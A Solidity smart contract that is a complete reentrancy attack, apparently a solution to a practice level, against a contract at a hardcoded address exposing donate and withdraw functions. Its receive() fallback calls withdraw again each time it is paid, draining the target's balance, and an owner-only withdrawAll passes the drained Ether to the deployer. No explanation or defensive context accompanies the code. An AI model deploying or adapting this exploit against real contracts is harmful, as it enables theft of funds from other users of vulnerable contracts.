// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract Reentrancy {
    IReentrance public reentranceContract =
        IReentrance(0xDC657E9D7b946A79B37410d0E825bbb715fbf7A1);

    uint256 public amount = 0.001 ether;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= amount);
        reentranceContract.donate{value: msg.value}(address(this));
        reentranceContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint256 totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call{value: totalBalance}("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        if (address(reentranceContract).balance > 0) {
            reentranceContract.withdraw(amount);
        }
    }
}
